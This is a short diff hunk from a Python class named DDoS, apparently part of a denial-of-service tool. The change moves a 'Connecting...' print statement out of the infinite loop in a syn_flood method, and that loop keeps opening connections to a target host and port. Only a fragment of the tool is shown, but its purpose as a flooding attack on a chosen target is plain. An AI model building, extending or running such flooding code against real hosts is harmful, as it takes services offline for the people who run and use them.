@@ -40,8 +40,8 @@ class DDoS:
         self.pack = pack
     
     def syn_flood(self):
+        print("Connecting...")
         while True:
-            print("Connecting...")
             
             try:
                 self.client.connect((self.host, self.port))
